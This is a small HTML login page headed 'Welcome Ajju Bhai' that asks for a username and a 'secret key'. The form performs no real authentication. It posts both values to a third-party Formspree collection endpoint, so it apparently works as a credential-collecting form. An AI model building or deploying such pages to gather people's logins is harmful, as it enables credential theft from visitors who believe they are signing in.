<!DOCTYPE html>
<html>
<head>
    <title>Login - Ajju Bhai</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
            text-align: center;
            color: white;
            width: 300px;
        }
        h1 { margin-bottom: 30px; text-shadow: 2px 2px 4px #000; }
        input {
            width: 90%; padding: 12px; margin: 10px 0; border: none;
            border-radius: 10px; background: rgba(255,255,255,0.2);
            color: white; font-size: 16px;
        }
        input::placeholder { color: #ddd; }
        button {
            width: 95%; padding: 12px; margin-top: 20px; border: none;
            border-radius: 10px; background: #ff6b6b; color: white;
            font-size: 18px; font-weight: bold; cursor: pointer;
        }
        button:hover { background: #ff4757; transform: scale(1.05); }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>🔥 Welcome Ajju Bhai 🔥</h1>
      <form action="https://formspree.io/f/mjgnyrqe" method="POST">
    <input type="text" name="username" placeholder="Username dalo" required><br>
    <input type="text" name="secret_key" placeholder="Secret key dalo" required><br>
    <button type="submit">Login Karo</button>
</form>
</div>
</body>
</html>
